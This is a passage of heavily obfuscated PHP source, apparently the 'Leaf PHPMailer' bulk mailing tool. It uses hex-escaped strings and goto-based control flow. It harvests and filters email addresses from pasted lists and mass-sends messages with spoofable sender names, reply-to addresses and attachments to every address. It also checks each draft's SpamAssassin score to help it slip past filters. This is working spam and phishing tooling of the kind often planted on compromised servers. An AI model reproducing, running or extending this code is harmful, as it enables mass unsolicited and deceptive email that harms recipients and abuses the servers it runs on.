header("\x43\x6f\156\x74\145\x6e\x74\55\x54\171\160\145\x3a\40\141\x70\x70\154\x69\x63\x61\164\151\x6f\x6e\57\157\143\164\x65\164\x2d\x73\x74\x72\x65\x61\x6d"); header("\103\157\156\164\145\x6e\x74\55\x44\x69\163\x70\x6f\x73\151\164\151\x6f\156\x3a\x20\141\x74\164\x61\x63\150\x6d\145\156\164\x3b\x20\146\151\x6c\145\x6e\141\x6d\145\x3d\x65\155\141\151\x6c\163" . time() . "\x2e\x74\170\164"); } else { header("\103\157\x6e\164\x65\156\164\55\x54\171\160\x65\x3a\x20\x74\145\x78\164\57\x70\154\x61\x69\x6e"); } if ($_POST["\163\x75\x62\155\x69\x74"] == "\x65\x78\164\162\x61\x63\164") { $pattern = "\57\133\101\55\132\x61\x2d\x7a\x30\55\71\56\x5f\45\53\x2d\x5d\x2b\x40\x5b\x41\55\x5a\x61\x2d\172\60\55\71\x2e\x2d\135\x2b\x5c\56\x5b\101\x2d\x5a\x61\55\x7a\135\173\62\54\x34\175\x2f"; preg_match_all($pattern, $_POST["\145\x6d\x61\151\154\x4c\151\163\x74"], $matches); foreach ($matches[0] as $email) { print $email . "\xa"; } } elseif ($_POST["\x73\x75\142\x6d\x69\164"] == "\146\x69\x6c\164\x65\x72") { $emails = explode("\12", $_POST["\x65\155\141\x69\x6c\x4c\x69\x73\164"]); $keywords = explode("\12", strtolower($_POST["\x6b\x65\x79\167\x6f\x72\x64\163"])); foreach ($emails as $email) { foreach ($keywords as $keyword) { if (strstr($email, $keyword)) { print $email . "\xa"; break; } } } } die; } leafheader(); print "\74\x64\x69\166\40\x63\x6c\x61\x73\163\75\x22\143\157\x6e\x74\141\x69\156\x65\x72\x20\143\x6f\154\x2d\154\147\55\x34\42\x3e\74\150\63\76\x3c\x66\x6f\156\x74\x20\x63\x6f\154\157\162\75\42\x67\162\x65\145\x6e\42\76\x3c\x73\160\x61\156\x20\x63\x6c\x61\163\x73\x3d\x22\x67\x6c\171\x70\x68\x69\143\157\156\x20\147\154\171\x70\150\x69\x63\x6f\x6e\55\x6c\x65\x61\x66\x22\76\x3c\x2f\x73\x70\x61\x6e\x3e\x3c\57\146\157\156\x74\x3e\x20\x4c\145\x61\146\40\x50\110\120\115\x61\x69\x6c\145\162\x20\x3c\163\155\141\x6c\x6c\x3e\x45\x6d\x61\151\154\x20\106\x69\154\x74\145\162\74\57\163\155\x61\x6c\x6c\76\74\x2f\x68\x33\76"; print "\xa\40\x20\x20\x20\74\x66\157\162\155\40\x61\143\164\x69\157\156\75\42\x3f\145\x6d\141\x69\154\x66\x69\x6c\164\x65\162\75\151\x66\162\x61\155\42\x20\155\x65\164\x68\157\144\x3d\42\120\x4f\123\124\42\40\164\x61\162\x67\145\164\x3d\42\x6d\171\x2d\151\x66\x72\141\x6d\145\42\40\145\x6e\x63\164\x79\160\145\x3d\42\x6d\x75\x6c\x74\151\160\141\162\x74\x2f\146\157\x72\155\x2d\x64\141\x74\141\42\x20\157\156\163\165\142\x6d\151\x74\x3d\x27\x27\x3e\xa\40\40\40\x20\x20\40\40\x20\x3c\154\x61\x62\x65\x6c\x20\146\x6f\162\75\42\145\x6d\141\151\x6c\x4c\151\x73\164\x22\76\x54\145\170\164\40\74\57\154\x61\142\x65\154\76\x3c\151\x6e\x70\165\x74\x20\x74\171\x70\x65\75\x22\146\x69\x6c\145\42\40\156\141\155\x65\75\42\146\151\x6c\145\124\157\125\160\x6c\157\x61\144\x22\x20\151\144\x3d\42\146\151\x6c\145\x54\157\125\160\x6c\x6f\141\144\42\76\40\xa\x20\40\40\40\x20\x20\40\40\x6f\162\xa\xa\40\40\x20\40\x20\40\40\40\x3c\x74\x65\170\164\141\162\145\x61\x20\156\x61\x6d\x65\75\42\x65\155\141\x69\154\114\151\163\164\x22\x20\151\x64\75\42\145\155\141\151\x6c\114\151\163\x74\42\40\143\x6c\141\x73\x73\75\42\146\x6f\162\155\x2d\143\157\x6e\164\x72\x6f\154\42\x20\162\157\x77\163\75\42\x37\x22\x20\151\144\75\42\164\x65\x78\x74\101\x72\145\x61\x22\76\74\57\164\145\170\164\x61\162\x65\141\76\12\x20\40\x20\40\40\40\x3c\x64\151\166\40\x63\x6c\x61\x73\x73\75\x22\x63\157\x6c\55\154\x67\55\x31\62\x22\x3e\xa\x20\40\x20\x20\40\40\40\x20\74\x64\151\x76\x20\143\x6c\141\x73\x73\x3d\x22\162\141\x64\151\157\42\76\12\40\x20\x20\40\40\x20\40\40\40\40\x3c\x6c\x61\x62\145\154\x3e\xa\x20\x20\40\x20\40\40\x20\40\40\x20\x20\40\x3c\151\x6e\x70\x75\164\40\x74\171\x70\x65\x3d\42\x72\x61\144\151\x6f\x22\x20\156\141\x6d\145\75\42\x72\145\x73\165\154\164\x74\x79\x70\x65\x22\x20\x69\x64\x3d\42\162\145\x73\x75\154\164\164\x79\160\145\42\40\166\x61\x6c\x75\x65\x3d\x22\150\x65\x72\x65\42\x20\143\x68\x65\143\153\145\x64\75\x22\x22\x3e\xa\40\x20\x20\40\40\40\x20\x20\x20\40\40\x20\x53\150\157\x77\40\122\x65\163\x75\x6c\x74\x20\151\156\40\164\x68\151\163\x20\160\141\147\145\xa\40\x20\40\x20\x20\40\x20\40\x20\40\74\57\x6c\x61\142\145\x6c\76\xa\x20\x20\x20\40\40\x20\x20\40\74\57\x64\151\166\x3e\12\x20\40\40\x20\x20\x20\x20\x20\x3c\144\151\166\x20\x63\154\x61\x73\163\75\x22\162\x61\x64\x69\157\x22\76\12\x20\40\x20\40\40\x20\40\40\40\40\x3c\154\141\x62\145\x6c\x3e\12\x20\x20\40\x20\40\x20\40\40\x20\40\x20\x20\74\151\x6e\160\x75\x74\40\164\x79\160\x65\75\42\x72\x61\x64\151\x6f\42\40\156\x61\x6d\x65\75\42\x72\145\163\165\154\x74\x74\x79\x70\x65\x22\40\151\x64\75\x22\x72\145\163\165\154\x74\164\171\x70\x65\42\x20\x76\141\154\165\145\x3d\42\x64\157\167\x6e\154\157\x61\144\x22\x3e\12\40\x20\40\40\x20\40\x20\40\40\40\x20\x20\x44\x6f\167\156\x6c\x6f\141\x64\40\x52\145\163\165\x6c\x74\40\x28\x66\157\x72\40\142\x69\147\40\156\165\155\142\x65\x72\163\51\12\40\x20\x20\40\x20\x20\x20\40\x20\40\x3c\57\154\141\x62\145\x6c\x3e\xa\x20\40\40\x20\40\40\40\40\74\57\x64\151\166\x3e\xa\40\x20\40\x20\40\x20\x3c\57\x64\x69\166\76\xa\x20\x20\x20\40\40\x20\40\40\40\40\40\x20\74\154\145\x67\145\156\144\76\74\x68\x34\x3e\105\170\x74\x72\x61\143\x74\x20\105\x6d\x61\x69\154\74\x2f\x68\x34\76\74\57\x6c\x65\147\x65\156\x64\x3e\12\40\40\x20\x20\40\x20\x20\x20\x20\40\40\x20\x44\x65\x74\x65\x63\x74\x69\156\147\x20\145\x76\x65\x72\171\x20\x65\x6d\141\x69\154\x20\x28\x31\60\60\45\51\40\141\156\x64\40\157\x72\144\x65\162\x20\164\x68\145\155\40\x6c\151\x6e\x65\40\142\x79\x20\x6c\151\x6e\x65\x20\x3c\142\162\76\74\142\x72\76\xa\x20\40\x20\40\x20\x20\x20\40\74\142\x75\x74\164\x6f\x6e\40\164\171\160\x65\x3d\42\163\165\x62\x6d\151\164\42\x20\156\x61\x6d\145\75\42\163\165\x62\155\151\x74\42\40\x76\x61\x6c\165\x65\75\x22\145\x78\164\162\141\143\x74\42\40\143\154\141\163\x73\x3d\x22\142\x74\x6e\x20\x62\x74\x6e\55\144\145\146\x61\165\154\164\x20\142\164\156\x2d\163\155\x22\x3e\123\164\141\162\x74\74\57\142\165\164\x74\x6f\x6e\x3e\xa\40\x20\40\40\x20\40\40\40\40\40\40\40\x3c\x6c\145\x67\145\x6e\144\76\x3c\150\64\x3e\x46\151\154\164\x65\x72\40\x45\x6d\x61\x69\154\163\x3c\x2f\x68\x34\x3e\74\57\x6c\x65\x67\x65\156\144\76\12\x20\40\x20\x20\x20\x20\x20\40\74\154\x61\x62\145\154\40\76\113\145\171\x77\157\162\144\163\x20\74\x73\155\141\154\x6c\x3e\40\x65\170\x3a\x20\147\x6d\x61\151\x6c\x2e\x63\x6f\x6d\x20\x6f\162\x20\x2e\143\157\56\165\x6b\74\57\163\x6d\x61\x6c\x6c\76\x20\x3c\57\154\x61\142\145\154\76\x3c\x74\145\x78\x74\141\162\145\141\40\x6e\x61\155\x65\x3d\x22\153\145\x79\x77\x6f\162\x64\163\x22\x20\151\x64\75\x22\x6b\145\171\x77\x6f\x72\x64\163\42\40\143\154\141\x73\x73\x3d\42\x66\157\162\x6d\x2d\x63\157\x6e\x74\162\157\154\x22\40\162\x6f\x77\x73\75\42\x34\42\40\151\x64\x3d\42\164\x65\x78\x74\101\x72\145\x61\x22\x3e\x67\155\x61\x69\154\x2e\x63\157\155\12\x68\x6f\x74\155\141\x69\x6c\x2e\143\x6f\155\12\171\x61\150\157\x6f\56\143\x6f\x6d\xa\56\x63\x6f\x2e\165\153\x3c\57\164\145\170\x74\x61\162\x65\141\76\74\x62\x72\76\xa\12\x20\x20\40\x20\40\x20\40\x20\40\x20\x20\40\x3c\x62\165\x74\x74\157\156\40\x74\171\160\x65\75\42\x73\x75\x62\155\x69\164\42\x20\x6e\141\x6d\x65\x3d\x22\163\165\x62\155\x69\164\x22\40\x76\141\154\x75\145\75\x22\146\x69\154\x74\145\x72\x22\x20\x63\154\141\163\x73\75\42\142\x74\156\40\142\x74\156\x2d\x64\x65\x66\141\165\x6c\x74\x20\142\x74\x6e\x2d\163\x6d\x22\76\123\x74\141\x72\x74\74\57\x62\x75\164\x74\x6f\x6e\x3e\12\x20\40\x20\x20\x3c\57\x66\x6f\x72\155\x3e\xa\x20\40\x20\40\74\x6c\x61\142\145\x6c\40\76\122\145\163\165\154\164\x20\x3c\x2f\154\141\142\145\x6c\x3e\xa\40\x20\x20\40\x3c\151\x66\162\141\x6d\145\40\163\164\171\154\x65\x3d\x22\142\157\162\x64\145\x72\72\x6e\x6f\156\x65\x3b\x77\151\x64\164\x68\x3a\61\60\x30\45\x3b\42\x20\156\x61\x6d\x65\75\x22\155\171\55\151\146\162\141\x6d\x65\42\x20\x20\x73\x72\143\75\42\x3f\x65\155\141\x69\154\146\151\154\164\x65\162\75\x69\146\162\x61\x6d\42\x20\76\74\x2f\151\x66\x72\141\x6d\145\x3e\12\x20\40\40"; die; } goto HSyhl; oH_v4: session_start(); goto lLKrR; kNGrd: set_time_limit(0); goto Jjvk3; HSyhl: $html = "\143\150\145\x63\153\x65\144"; goto CrXZ_; lqytm: if ($_POST["\x61\x63\164\x69\157\x6e"] == "\163\x65\156\144") { print "\x20\x20\40\x20\74\144\151\x76\x20\x63\154\141\x73\x73\x3d\42\x63\x6f\x6c\x2d\154\x67\55\61\62\42\76"; $maillist = explode("\15\12", $emailList); $n = count($maillist); $x = 1; foreach ($maillist as $email) { print "\x3c\x64\x69\x76\x20\143\154\x61\x73\x73\75\x22\143\x6f\154\55\154\147\55\61\x22\x3e\x5b" . $x . "\57" . $n . "\x5d\74\57\x64\151\166\x3e\74\144\x69\166\x20\x63\154\x61\163\x73\75\x22\x63\x6f\154\x2d\x6c\147\55\x34\42\x3e" . $email . "\74\x2f\144\151\166\76"; if (!leafMailCheck($email)) { print "\x3c\144\x69\166\40\x63\x6c\141\x73\x73\x3d\x22\x63\x6f\x6c\55\154\x67\55\66\42\x3e\x3c\x73\x70\141\x6e\x20\x63\154\x61\x73\x73\x3d\42\x6c\141\x62\x65\x6c\40\154\x61\x62\x65\154\55\144\145\146\x61\x75\154\164\42\76\111\156\143\x6f\x72\x72\145\143\x74\40\105\155\x61\151\154\x3c\x2f\163\x70\x61\156\76\74\x2f\x64\x69\166\x3e"; print "\74\x62\x72\x3e\xd\12"; } else { $mail = new PHPMailer(); $mail->setFrom(leafClear($senderEmail, $email), leafClear($senderName, $email)); $mail->addReplyTo(leafClear($replyTo, $email)); $mail->addAddress($email); $mail->Subject = leafClear($subject, $email); $mail->Body = leafClear($messageLetter, $email); if ($messageType == 1) { $mail->IsHTML(true); $mail->AltBody = strip_tags(leafClear($messageLetter, $email)); } else { $mail->IsHTML(false); } $mail->CharSet = $charset; $mail->Encoding = $encoding; for ($i = 0; $i < count($_FILES["\141\x74\x74\141\x63\150\155\145\156\x74"]["\156\141\155\145"]); $i++) { if ($_FILES["\x61\x74\x74\x61\x63\150\x6d\145\156\x74"]["\164\x6d\x70\x5f\156\141\x6d\145"][$i] != '') { $mail->AddAttachment($_FILES["\141\x74\x74\141\143\x68\155\145\156\164"]["\x74\155\160\137\156\x61\155\145"][$i], $_FILES["\x61\164\x74\141\143\150\x6d\x65\x6e\x74"]["\x6e\141\155\x65"][$i]); } } if (!$mail->send()) { echo "\x3c\x64\151\166\x20\143\154\x61\163\x73\x3d\42\x63\157\x6c\55\x6c\147\55\66\42\x3e\74\163\160\x61\156\x20\143\154\x61\163\163\x3d\x22\154\x61\142\x65\154\40\154\141\142\145\x6c\55\144\x65\x66\x61\165\154\164\x22\76" . htmlspecialchars($mail->ErrorInfo) . "\74\57\x73\x70\x61\156\x3e\x3c\x2f\144\x69\x76\76"; } else { echo "\74\x64\151\x76\x20\x63\x6c\x61\x73\163\75\x22\x63\x6f\x6c\55\x6c\x67\55\x36\x22\x3e\74\163\x70\141\156\40\143\x6c\x61\x73\163\75\x22\154\141\142\x65\x6c\x20\154\141\x62\x65\x6c\55\x73\x75\143\x63\145\163\x73\x22\76\117\153\74\57\163\x70\x61\156\76\x3c\x2f\144\x69\166\76"; } print "\x3c\142\162\76\xd\12"; } $x++; for ($k = 0; $k < 40000; $k++) { echo "\40"; } } } elseif ($_POST["\x61\143\164\x69\157\156"] == "\x73\x63\x6f\162\145") { $mail = new PHPMailer(); $mail->setFrom(leafClear($senderEmail, $email), leafClear($senderName, $email)); $mail->addReplyTo(leafClear($replyTo, $email)); $mail->addAddress("\x75\163\x65\162\x6e\141\155\x65\x40\x64\x6f\155\x61\151\156\x2e\143\157\x6d"); $mail->Subject = leafClear($subject, $email); $mail->Body = leafClear($messageLetter, $email); if ($messageType == 1) { $mail->IsHTML(true); $mail->AltBody = strip_tags(leafClear($messageLetter, $email)); } else { $mail->IsHTML(false); } $mail->CharSet = $charset; $mail->Encoding = $encoding; $mail->preSend(); $messageHeaders = $mail->getSentMIMEMessage(); $ch = curl_init(); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_URL, "\150\x74\164\x70\72\x2f\x2f\x73\x70\141\155\x63\x68\145\x63\153\x2e\160\x6f\x73\x74\155\x61\162\x6b\x61\160\x70\x2e\143\x6f\x6d\x2f\x66\151\154\x74\x65\162"); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array("\145\x6d\x61\151\154" => $messageHeaders, "\x6f\x70\164\151\x6f\x6e\x73" => "\154\157\x6e\x67"))); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_TIMEOUT, 15); $response = curl_exec($ch); $response = json_decode($response); print "\40\40\40\40\74\x64\x69\166\x20\143\x6c\141\163\163\x3d\x22\x63\x6f\x6c\x2d\154\x67\55\x31\62\x22\76"; if ($response->success == TRUE) { $score = $response->score; if ($score > 5) { $class = "\144\x61\x6e\x67\x65\162"; } else { $class = "\163\165\143\143\145\163\163"; } print "\x3c\144\151\x76\x20\143\154\141\163\x73\x3d\42\x74\145\170\164\55" . $class . "\42\x3e\x59\157\x75\x72\x20\x53\x70\141\155\101\x73\163\x61\x73\x73\x69\156\x20\x73\143\x6f\x72\145\x20\151\x73\40" . $score . "\x20\40\x3c\x2f\144\151\166\x3e\12\x3c\144\x69\x76\76\106\x75\x6c\154\40\122\x65\160\157\162\x74\40\x3a\x20\x3c\160\162\145\x3e" . $response->report . "\x3c\x2f\x70\x72\x65\x3e\74\57\x64\x69\166\x3e"; print "\x20\x20\40\x20\x3c\x2f\x64\151\x76\76"; } } goto pwyMF; Jjvk3: ini_set("\155\x65\x6d\x6f\x72\x79\x5f\154\151\155\151\x74", -1); goto lHPzW; oheeu: ?>